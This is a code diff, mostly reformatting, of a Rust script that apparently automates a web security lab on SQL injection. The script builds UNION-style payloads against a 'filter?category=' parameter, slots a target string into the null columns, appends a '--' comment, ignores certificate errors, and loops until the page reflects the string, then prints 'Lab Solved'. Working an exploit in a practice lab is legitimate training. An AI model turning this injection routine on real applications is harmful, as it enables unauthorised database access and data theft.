@@ -51,7 +51,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
         .danger_accept_invalid_certs(true)
         .cookie_store(true)
         .build()?;
-    
+
     let product_url = format!("{}/filter?category=", host);
     let null_value = "null";
     let comment = "--";
@@ -82,49 +82,49 @@ async fn main() -> Result<(), Box<dyn Error>> {
         .await?
         .text()
         .await?;
-    
+
     if check_internal_server_error(&resp_text_new) {
         let home_text = client.get(host).send().await?.text().await?;
         let s = fetch_string_literal(&home_text);
         let s_no_quotes = s.clone();
         let s_quoted = format!("'{}'", s);
-        
+
         let parts: Vec<&str> = payload1.split("null").collect();
         let mut payloads = Vec::new();
-        
+
         for i in 1..parts.len() {
             let before = parts[..i].join("null");
             let after = parts[i..].join("null");
             let final_payload = format!("{}{}{}", before, s_quoted, after);
             payloads.push(final_payload);
         }
-        
-    for payload in payloads {
-    let full_payload = format!("{}{}", payload, comment);
-    println!("{}", full_payload);
-    let resp = client.get(&full_payload).send().await?;
 
-    if resp.status().as_u16() == 500 {
-        println!("Status 500 - skipping");
-        continue;
-    }
+        for payload in payloads {
+            let full_payload = format!("{}{}", payload, comment);
+            println!("{}", full_payload);
+            let resp = client.get(&full_payload).send().await?;
 
-    let resp_text = resp.text().await?;
+            if resp.status().as_u16() == 500 {
+                println!("Status 500 - skipping");
+                continue;
+            }
 
-    if let Some(fetched) = string_fetched_final_request(&resp_text) {
-        println!("Fetched value: {}", fetched);
-        println!("Target value: {}", s_no_quotes);
-        if s_no_quotes == fetched {
-            println!("[+] Lab Solved LESSGOOOOO");
-            break;
-        } else {
-            println!("Try harder noob!");
+            let resp_text = resp.text().await?;
+
+            if let Some(fetched) = string_fetched_final_request(&resp_text) {
+                println!("Fetched value: {}", fetched);
+                println!("Target value: {}", s_no_quotes);
+                if s_no_quotes == fetched {
+                    println!("[+] Lab Solved LESSGOOOOO");
+                    break;
+                } else {
+                    println!("Try harder noob!");
+                }
+            } else {
+                println!("No value fetched from response");
+            }
         }
-    } else {
-        println!("No value fetched from response");
-    }
-}
     }
 
-    Ok(())
-}
+        Ok(())
+    }
